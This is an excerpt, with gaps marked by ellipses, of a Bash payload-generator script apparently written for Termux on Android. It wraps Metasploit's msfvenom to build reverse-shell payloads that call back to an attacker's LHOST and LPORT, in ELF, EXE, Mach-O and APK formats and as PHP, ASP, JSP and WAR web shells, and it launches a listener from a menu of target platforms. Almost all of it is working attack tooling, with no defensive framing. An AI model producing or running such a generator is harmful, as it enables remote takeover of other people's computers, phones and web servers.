...
command -v /data/data/com.termux/files/home/metasploit-framework/msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
...
binaries_linux() {
format=".elf"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f elf > $payload_name.elf

}

binaries_windows() {
format=".exe"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f exe > $payload_name.exe 
...
binaries_mac() {
format=".macho"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f macho > $payload_name.macho
...
binaries_Android() {
format=".apk"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 R > $payload_name.apk
...
php_payload() {
format=".php"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.php

}

asp_payload() {
format=".asp"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.asp
}

jsp_payload() {
format=".jsp"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.jsp

}
war_payload() {
format=".war"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f war > $payload_name.war

}

python_payload(){
format=".sh"
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
...
/data/data/com.termux/files/home/metasploit-framework/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name
listener
}
...
printf "\e[1;93m[\e[0m\e[1;77m2\e[0m\e[1;93m] Windows\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m3\e[0m\e[1;93m] MAC\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m4\e[0m\e[1;93m] Android_tcp \e[0m\n"
printf "\[1;93m[\e[0m\e[1;77m5\e[0m\e[1;93m] Android_https \e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
